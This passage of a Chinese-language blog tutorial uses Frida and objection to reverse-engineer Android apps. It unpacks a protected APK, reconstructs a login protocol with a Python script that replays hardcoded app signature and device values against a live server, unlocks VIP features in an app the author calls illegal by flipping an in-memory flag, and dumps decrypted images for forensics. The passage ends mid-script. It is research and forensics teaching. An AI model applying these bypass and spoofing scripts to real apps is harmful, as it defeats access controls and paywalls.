style="zoom:67%;" /></p><p>&emsp;movetv.apk的登陆界面抓包如下：</p><p><img src="/images/frida-reverse-analysis-2/image-20231009234020487.png" alt="image-20231009234020487" style="zoom:67%;" /></p><p><img src="/images/frida-reverse-analysis-2/image-20231009234104412.png" alt="image-20231009234104412" style="zoom:67%;" /></p><h4 id="注册-登录协议分析"><a href="#注册-登录协议分析" class="headerlink" title="注册/登录协议分析"></a>注册/登录协议分析</h4><p>&emsp;通过抓包分析，name与pass分别代表用户名与密码，而login始终为”login”。而key、rightkey、memi1等字段暂时还不确定。</p><p>&emsp;要对这些字段进行分析，需要<code>找到字段形成的地方</code>。除了<strong>静态工具分析</strong>外，推荐使用前面介绍的快速定位关键类的方式，即<code>基于内存枚举的关键类定位方案</code>，以确定字段形成的位置。</p><p>&emsp;在此，基于用户登录一定要单击<code>登录</code>按钮的特性，而按钮button属于view的继承类，因此可以通过hook view类的onClick函数快速得到当前控件的onClick函数所在的类，如下hookEvent.js所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jclazz = <span class="literal">null</span></span><br><span class="line"><span class="keyword">var</span> jobj = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getObjClassName</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!jclazz)&#123;</span><br><span class="line">        <span class="keyword">var</span> jclazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Class&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!jobj)&#123;</span><br><span class="line">        <span class="keyword">var</span> jobj = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Object&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> jclazz.<span class="property">getName</span>.<span class="title function_">call</span>(jobj.<span class="property">getClass</span>.<span class="title function_">call</span>(obj))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">watch</span>(<span class="params">obj, mtdName</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> listener_name = <span class="title function_">getObjClassName</span>(obj)</span><br><span class="line">    <span class="keyword">var</span> target = <span class="title class_">Java</span>.<span class="title function_">use</span>(listener_name)</span><br><span class="line">    <span class="comment">// target should have onClick method</span></span><br><span class="line">    <span class="keyword">if</span>(!target || !mtdName <span class="keyword">in</span> target)&#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    target[mtdName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">overload</span>)&#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[WatchEvent] &quot;</span> + mtdName + <span class="string">&quot;: &quot;</span> + <span class="title function_">getObjClassName</span>(<span class="variable language_">this</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>[mtdName].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">OnClickListener</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// start in spawn mode</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.view.View&quot;</span>).<span class="property">setOnClickListener</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">listener</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(listener != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="title function_">watch</span>(listener, <span class="string">&#x27;onClick&#x27;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">setOnClickListener</span>(listener)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// start in attach mode</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;android.view.View$ListenerInfo&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                instance = instance.<span class="property">mOnClickListener</span>.<span class="property">value</span></span><br><span class="line">                <span class="keyword">if</span>(instance)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mOnClickListener : &quot;</span> + <span class="title function_">getObjClassName</span>(instance))</span><br><span class="line">                    <span class="title function_">watch</span>(instance, <span class="string">&#x27;onClick&#x27;</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(<span class="title class_">OnClickListener</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 注入到前台 app 中</span><br><span class="line">frida -U -F -l hookEvent.js</span><br></pre></td></tr></table></figure><p>&emsp;结果为：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010110906554.png" alt="image-20231010110906554" style="zoom:67%;" /></p><p>&emsp;因此，找到字段形成的地方为<code>com.cz.babySister.activity.LoginActivity</code>。</p><p>&emsp;之后，要得到此类具体的代码，可以通过静态反编译工具进行。发现进行<a href="https://www.isisy.com/1420.html">加壳处理</a>：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010112211340.png" alt="image-20231010112211340" style="zoom:67%;" /></p><p>&emsp;可以利用脱壳工具进行脱壳，例如一代<code>frida_dexdump</code>，二代抽取脱壳<code>frida_fart|FART</code>等。在此使用frida_dexdump，流程见<a href="https://github.com/hluwa/frida-dexdump">链接</a>。脱壳出5个dex，在dex3中找到：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010115547318.png" alt="image-20231010115547318" style="zoom:67%;" /></p><p>&emsp;其中，猜测b()函数应该是提交用户名与密码到服务器的函数。使用objection对b()函数进行注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objection -g com.cz.babySister explore</span><br><span class="line">android hooking watch class_method com.cz.babySister.activity.LoginActivity.b --dump-args --dump-return --dump-backtrace</span><br></pre></td></tr></table></figure><p>&emsp;结果如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010120458729.png" alt="image-20231010120458729" style="zoom:80%;" /></p><p>&emsp;因此确定b()传递用户名与密码。在用静态分析跟踪实现，最终确认到了q()函数，但是跟进后发现全为nop，如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010125607830.png" alt="image-20231010125607830" style="zoom:67%;" /></p><p>&emsp;经过查询资料，发现是<a href="https://blog.csdn.net/zhangmiaoping23/article/details/52160473">二代抽取加固</a>，使用frida_fart，按照<a href="https://blog.51cto.com/u_15101562/2622401">链接</a>进行脱壳（注意到对movetv.apk设置读取sd卡的权限）。经历千辛万苦，终于找到了正常的逻辑：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010152911816.png" alt="image-20231010152911816" style="zoom:67%;" /></p><p>&emsp;依次跟进v5（key）、v6（rightkey）、v4（memi1）的实现逻辑，如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010153119863.png" alt="image-20231010153119863" style="zoom:67%;" /></p><p><img src="/images/frida-reverse-analysis-2/image-20231010153237044.png" alt="image-20231010153237044" style="zoom:67%;" /></p><p><img src="/images/frida-reverse-analysis-2/image-20231010153542277.png" alt="image-20231010153542277" style="zoom:67%;" /></p><p>&emsp;审计上述代码，发现：v5（key）实际上是app的签名，v6（rightkey）是app所安装的包的证书部分，v4（memi1）是android_id。这些值都是固定值，因此，无需借助app，只需要输入正确的用户名与密码，再传入固定的key、rightkey、memi1即可。</p><p>&emsp;app注册的逻辑与登陆类似。最终可以<strong>用python实现脱机注册与登录</strong>，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># invoke.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">tv</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.root = <span class="string">&quot;http://39.108.64.125/WebRoot/superMaster/Server&quot;</span></span><br><span class="line">        self.memi1 = <span class="string">&quot;34463b7d13ee6ad9&quot;</span></span><br><span class="line">        self.rightkey = <span class="string">&quot;376035775&quot;</span></span><br><span class="line">        self.key = <span class="string">&quot;308202d5308201bda00302010202041669d9bf300d06092a864886f70d01010b0500301b310b3009060355040613023836310c300a06035504031303776569301e170d3136303731383038313935395a170d3431303731323038313935395a301b310b3009060355040613023836310c300a0603550403130377656930820122300d06092a864886f70d01010105000382010f003082010a028201010095f85892400aae03ca4ed9dcd838d162290ae8dd51939aac6ecfde8282f207c4cd9e507929a279e0a36f1e4847330cb53908c92915b2c6a93d7064be452d073a472093f7ca14f4ab68f827582fe0988e9e4bc8a6ea3b56001cbbbb760f9eec571b0bbc97392e65aaf08c686f0e2ba353896d48a37c36716239977bd0e4dd878025cab497d8164537aec9f6599eefb98577dce972a1b794e211226520e23497beec3fd8548bb5b4d263120d40115cca28116bac32378df5033f536a0d7367fef78c587fefed28c5c9b35ba684ed6e46d9369c40950cf7ad7236d10b7a51dfd2a8f218db72323bbd19f46947410b1191f263012ad4ba8f749223e37591254ee7f50203010001a321301f301d0603551d0e041604143d43284bd5e4b0d322c9962a5b70aad4dcbc3634300d06092a864886f70d01010b050003820101000f04c51ff763311aa011777ba2842b441b15c316373d1e1ed4116cf86e29d55c6ed3fa4c475251b1fb4fac57195dbca0166ebe565d9834552a3758b97c4528bab1f7ab82bb3a9faa932f5bc10943f3daf52e0fe5889ffb58a6be67ea1c9a2fb37dc8aa6f3af476039a467336991a4e52dccd520195cd473eb5b984e702ed9ff638a14c3abb575a7a80ae4062084d1138a06a20e173be9df32df631311b07352898706198ddebaaa011f0da8e5f288f7cfb77505bc943f6476d6cc1feef56b68137aad91f23c4bb772169539d05653a6f0d75f7192164e822b934322f3a975df677903b1667f5dc1e9ddb185da3281d31bfb8f67a84bd23bbcb398f8bb637dd72&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, data=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            data = &#123;&#125;</span><br><span class="line">        <span class="keyword">return</span> requests.post(url = self.root, data = data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">self, name, pw</span>):</span><br><span class="line">        ret = self.post(&#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>:name, </span><br><span class="line">            <span class="string">&quot;pass&quot;</span>:pw,</span><br><span class="line">            <span class="string">&quot;memi1&quot;</span>:self.memi1,</span><br><span class="line">            <span class="string">&quot;key&quot;</span>:self.key,</span><br><span class="line">            <span class="string">&quot;rightkey&quot;</span>:self.rightkey,</span><br><span class="line">            <span class="string">&quot;register&quot;</span>:<span class="string">&quot;register&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;register: &quot;</span>, ret.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">self, name, pw</span>):</span><br><span class="line">        ret = self.post(&#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>:name, </span><br><span class="line">            <span class="string">&quot;pass&quot;</span>:pw,</span><br><span class="line">            <span class="string">&quot;memi1&quot;</span>:self.memi1,</span><br><span class="line">            <span class="string">&quot;key&quot;</span>:self.key,</span><br><span class="line">            <span class="string">&quot;rightkey&quot;</span>:self.rightkey,</span><br><span class="line">            <span class="string">&quot;login&quot;</span>:<span class="string">&quot;login&quot;</span></span><br><span class="line">        &#125;)       </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;login: &quot;</span>, ret.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    tv = tv()</span><br><span class="line">    <span class="comment"># register</span></span><br><span class="line">    <span class="built_in">print</span>(tv.register(<span class="string">&quot;wd2711&quot;</span>, <span class="string">&quot;1111&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># login</span></span><br><span class="line">    <span class="built_in">print</span>(tv.login(<span class="string">&quot;wd2711&quot;</span>, <span class="string">&quot;1111&quot;</span>))</span><br></pre></td></tr></table></figure><p>&emsp;结果如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010155627948.png" alt="image-20231010155627948" style="zoom:67%;" /></p><h3 id="违法应用取证分析与vip破解"><a href="#违法应用取证分析与vip破解" class="headerlink" title="违法应用取证分析与vip破解"></a>违法应用取证分析与vip破解</h3><p>&emsp;安装fulao2.apk。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install fulao2.apk</span><br></pre></td></tr></table></figure><h4 id="vip清晰度破解"><a href="#vip清晰度破解" class="headerlink" title="vip清晰度破解"></a>vip清晰度破解</h4><p>&emsp;手机app对应的服务器好像寄了，如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010163343163.png" alt="image-20231010163343163" style="zoom:67%;" /></p><p>&emsp;ok，那抓不了包了，日了。那直接定位关键类，由于书中写了，清晰度切换是一个按钮控件，这需要vip。因此，我们只需要使用之前抓取按钮的脚本hookEvent.js即可。但是由于我们进不去页面呀（hookEvent.js，此时清晰度控件应该还未加载），只能抓取到：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010164845820.png" alt="image-20231010164845820" style="zoom:67%;" /></p><p>&emsp;正常的话，应该抓取到<code>com.ilulutv.fulao2.film.l$t</code>。</p><p>&emsp;且验证此apk未加壳（PKID不准，movetv.apk放进去也显示这个）：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010165814405.png" alt="image-20231010165814405" style="zoom:67%;" /></p><p>&emsp;定位到<code>com.ilulutv.fulao2.film.l$t</code>这个类，如下所示，可以看到是一个判断语句。</p><p><img src="/images/frida-reverse-analysis-2/image-20231010170758627.png" alt="image-20231010170758627" style="zoom:67%;" /></p><p>&emsp;之后分析各个判断语句之后执行的操作：</p><p>（1）<code>this.d.i</code>：生成一个对话框，其中要求升级vip。</p><p><img src="/images/frida-reverse-analysis-2/image-20231010172852843.png" alt="image-20231010172852843" style="zoom:67%;" /></p><p>（2）…</p><p>&emsp;那么，如果将<code>l.d(this.d)</code>的值设置为true即可。由于此app已无法正常访问，因此以书中为准。使用frida脚本在内存中修改<code>l.d(this.d)</code>的值。<code>l.d</code>的实现如下，其中arg0为l类型：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010173538290.png" alt="image-20231010173538290" style="zoom:67%;" /></p><p>&emsp;脚本如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hookq0.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookq0</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.ilulutv.fulao2.film.l&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance =&gt;&quot;</span>, instance)</span><br><span class="line">                instance.<span class="property">q0</span>.<span class="property">value</span> = <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;completed&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;最终调用成功了，可惜我这无法验证，呜呜。</p><h4 id="图片取证分析"><a href="#图片取证分析" class="headerlink" title="图片取证分析"></a>图片取证分析</h4><p>&emsp;之后分析app协议内容。协议分析的第一步：<code>针对样本流量的抓取与关键字段的定位</code>。</p><p>&emsp;本次抓包不使用之前的<code>中间人抓包（charles|postern）</code>，而是使用hook抓包，其优势在于：<code>（1）抓取的流量更加专一，不会受到手机上其他app流量的影响；（2）可以避免app本身对抗抓包的姿势，例如服务器校验客户端，SSL Pinning等</code>。但是，如果app有对抗frida等工具的手段，那么就需要bypass。<code>（3）hook可以打印调用栈，因此可确定函数之前经过的所有函数。</code></p><p>&emsp;hook抓包的效果取决于找到的hook点。（1）android有很多封装网络通信的库，例如okhttp3、retrofit。因此，可能需要针对不同的库设置hook点。（2）对于通信协议而言，只抓取http的hook点也不够全面。之后装逼时刻，r0ysue开发了r0capture，<code>hook系统中在socket层发送和接收数据包的关键函数，基本上能抓所有流量</code>。</p><p>&emsp;虽然跑不了，但是分析一波<a href="https://github.com/r0ysue/r0capture">r0capture</a>，此书中利用r0capture抓取了图片（挖个坑）。抓取后的图片是加密的。那之后，就要找到图片解密的点。<code>图片要加载的时候，此时图片就被解密</code>。</p><p>&emsp;android中加载图片的过程：使用BitmapFactory类中的函数加载bitmap，最终通过ImageView加载Bitmap类型的图片。</p><p>&emsp;为了验证这个过程，使用objection插件wallbreaker在内存中搜索Bitmap对象，手动触发图片的加载后再次搜索Bitmap对象，前后数量不一致，因此可以确定此app使用Bitmap对象来保存图片。</p><p>&emsp;android开发中，BitmapFactory中有4个静态方法：<code>decodeFile、decodeResource、decodeStream、decodeByteArray</code>，分别用于从<code>文件系统、资源、输入流、字节数组</code>中加载出Bitmap对象。更暴力一点，对BitmapFactory中所有函数进行hook，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class android.graphics.BitmapFactory </span><br></pre></td></tr></table></figure><p>&emsp;最终发现是使用<code>decodeByteArray</code>函数（static），此函数的第1个参数就是原始图片的字节信息。为了确认此图片信息为明文，使用frida脚本获取参数并保存。saveBitmap.js代码如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// generate random string as image name</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">guid</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx&quot;</span>.<span class="title function_">replace</span>(<span class="regexp">/[xy]/g</span>, <span class="keyword">function</span>(<span class="params">c</span>)&#123;</span><br><span class="line">        <span class="comment">// generate r in [0:1:15]</span></span><br><span class="line">        <span class="keyword">var</span> r = <span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">16</span> | <span class="number">0</span></span><br><span class="line">        <span class="keyword">var</span> v = c == <span class="string">&quot;x&quot;</span> ? r : (r&amp;<span class="number">0x3</span>|<span class="number">0x8</span>)</span><br><span class="line">        <span class="keyword">return</span> v.<span class="title function_">toString</span>(<span class="number">16</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hook decodeByteArray</span></span><br><span class="line"><span class="comment">// decodeByteArray(byte[] data, int offset, int length, Options opts)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">saveBitmap_1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">BitmapFactory</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.graphics.BitmapFactory&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> decodeByteArray_func = decodeByteArray.<span class="title function_">overload</span>(<span class="string">&quot;[B&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;android.graphics.BitmapFactory$Options&quot;</span>)</span><br><span class="line">        decodeByteArray_func.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">data, offset, length, opts</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">decodeByteArray</span>(data, offset, length, opts)</span><br><span class="line">            <span class="keyword">var</span> path = <span class="string">&quot;/sdcard/Download/tmp&quot;</span> + <span class="title function_">guid</span>() + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;path =&gt;&quot;</span>, path)</span><br><span class="line">            <span class="keyword">var</span> f = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.File&quot;</span>).$new(path)</span><br><span class="line">            <span class="keyword">var</span> fos = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.FileOutputStream&quot;</span>).$new(f)</span><br><span class="line">            fos.<span class="title function_">write</span>(data)</span><br><span class="line">            fos.<span class="title function_">close</span>()</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(saveBitmap_1)</span><br></pre></td></tr></table></figure><p>&emsp;之后，对上述脚本中的saveBitmap_1进行修改，以适应最后的rpc操作：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hookBitmap.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">saveBitmap_1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">BitmapFactory</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.graphics.BitmapFactory&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> decodeByteArray_func = <span class="title class_">BitmapFactory</span>.<span class="property">decodeByteArray</span>.<span class="title function_">overload</span>(<span class="string">&quot;[B&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;android.graphics.BitmapFactory$Options&quot;</span>)</span><br><span class="line">        decodeByteArray_func.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">data, offset, length, opts</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">decodeByteArray</span>(data, offset, length, opts)</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            var path = &quot;/sdcard/Download/tmp&quot; + guid() + &quot;.jpg&quot;</span></span><br><span class="line"><span class="comment">            console.log(&quot;path =&gt;&quot;, path)</span></span><br><span class="line"><span class="comment">            var f = Java.use(&quot;java.io.File&quot;).$new(path)</span></span><br><span class="line"><span class="comment">            var fos = Java.use(&quot;java.io.FileOutputStream&quot;).$new(f)</span></span><br><span class="line"><span class="comment">            fos.write(data)</span></span><br><span class="line"><span class="comment">            fos.close()</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="title function_">send</span>(data)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(saveBitmap_1)</span><br></pre></td></tr></table></figure><p>&emsp;相应python脚本为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># saveBitmap.py</span></span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message, payload</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;send&quot;</span>:</span><br><span class="line">        image = message[<span class="string">&quot;payload&quot;</span>]</span><br><span class="line">        </span><br><span class="line">        intArr = []</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> 